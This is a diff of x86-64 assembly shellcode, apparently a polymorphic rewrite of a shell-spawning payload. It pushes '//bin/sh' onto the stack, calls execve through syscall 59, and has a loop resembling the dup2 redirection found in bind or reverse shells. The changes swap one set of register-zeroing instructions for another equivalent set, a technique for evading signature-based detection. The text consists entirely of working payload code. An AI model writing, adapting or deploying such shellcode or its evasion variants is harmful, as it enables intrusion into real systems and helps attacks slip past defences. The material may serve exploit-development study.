@@ -7,15 +7,10 @@ section .text
 
 _start:
 
-  mov rax, 0x1111111111111111
-  and rax, 0x11112
-
-  div rax
-  dec rax
+  sar rax, 63
   sar rbx, 63
-  shr rcx, 63
-  mov rdx, 0xFFFFFFFFFFFFFFFF
-  add rdx, 1
+  sub rcx, rcx
+  xor rdx, rdx
         xor rsi, rsi
         xor rdi, rdi
 
@@ -48,14 +43,13 @@ loop:
         cmp rsi, 2
         jle loop
 
-  mov rax, 0x1111111111111111
-  div rax
-  dec rax
+  sub rax, rax
         mov rdi, 0x68732f6e69622f2f
         xor rsi, rsi
         push rsi
         push rdi
         mov rdi, rsp
-  sar rdx, 63
+  mov rdx, 0xFFFFFFFFFFFFFFFF
+  add rdx, 1
         mov al, 59
         syscall
